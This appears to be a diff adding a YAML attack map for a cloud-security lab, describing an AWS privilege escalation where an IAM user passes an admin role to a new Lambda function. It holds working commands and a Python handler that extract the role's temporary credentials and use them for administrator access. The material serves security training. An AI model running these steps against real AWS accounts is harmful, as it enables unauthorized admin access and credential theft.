@@ -1,0 +1,91 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-lambda-001-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has iam:PassRole permission on the target admin role, along with
+        lambda:CreateFunction and lambda:InvokeFunction permissions. This combination
+        allows you to create a Lambda function that runs as the admin role and extract
+        its temporary credentials.
+
+    - id: lambda-function
+      label: "Lambda Function"
+      type: resource
+      subType: lambda-function
+      arn: "arn:aws:lambda:{region}:{account_id}:function/pl-lambda-001-attack"
+      description: >
+        This Lambda function is created by the attacker during the attack. It is
+        configured to use the admin target role as its execution role. When invoked,
+        the function returns the temporary AWS credentials it received from the
+        execution role, allowing the attacker to operate as the admin role.
+
+    - id: target-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role"
+      description: >
+        This IAM role has AdministratorAccess. By passing this role to a Lambda function
+        and invoking that function to extract its temporary credentials, you now have the
+        ability to operate as an administrator in this AWS account.
+
+  edges:
+    - from: starting-principal
+      to: lambda-function
+      label: "iam:PassRole + lambda:CreateFunction"
+      description: >
+        Create a Lambda function that uses the admin target role as its execution role.
+        The iam:PassRole permission allows the starting user to associate the admin role
+        with the new Lambda function.
+      hints:
+        - "You can pass an IAM role to a Lambda function when creating it."
+        - "Lambda functions automatically receive temporary credentials for their execution role."
+        - "Create a Lambda function with the admin role, invoke it to extract credentials, then use those credentials."
+        - "Browse to https://pathfinding.cloud/paths/lambda-001 for technique details."
+      commands:
+        - description: "Create a Lambda deployment package that extracts execution role credentials"
+          command: |
+            cat > /tmp/lambda_function.py << 'EOF'
+            import os, json
+            def lambda_handler(event, context):
+                return {
+                    'statusCode': 200,
+                    'body': json.dumps({
+                        'access_key': os.environ['AWS_ACCESS_KEY_ID'],
+                        'secret_key': os.environ['AWS_SECRET_ACCESS_KEY'],
+                        'session_token': os.environ['AWS_SESSION_TOKEN']
+                    })
+                }
+            EOF
+            cd /tmp && zip lambda_payload.zip lambda_function.py
+        - description: "Create the Lambda function with the admin execution role"
+          command: "aws lambda create-function --function-name pl-lambda-001-attack --runtime python3.12 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_payload.zip"
+
+    - from: lambda-function
+      to: target-role
+      label: "lambda:InvokeFunction"
+      description: >
+        Invoke the Lambda function to execute code under the admin role's identity.
+        The function returns the temporary credentials assigned to it via the execution
+        role, granting the attacker administrative access.
+      hints:
+        - "Lambda functions receive credentials via environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN."
+        - "Write a handler that reads and returns these environment variables, then invoke the function."
+      commands:
+        - description: "Invoke the Lambda function and extract the temporary admin credentials"
+          command: "aws lambda invoke --function-name pl-lambda-001-attack /tmp/lambda_output.json && cat /tmp/lambda_output.json"
+        - description: "Configure the AWS CLI with the extracted temporary credentials"
+          command: "export AWS_ACCESS_KEY_ID=<access_key> && export AWS_SECRET_ACCESS_KEY=<secret_key> && export AWS_SESSION_TOKEN=<session_token>"
+        - description: "Verify administrator access"
+          command: "aws iam list-users"
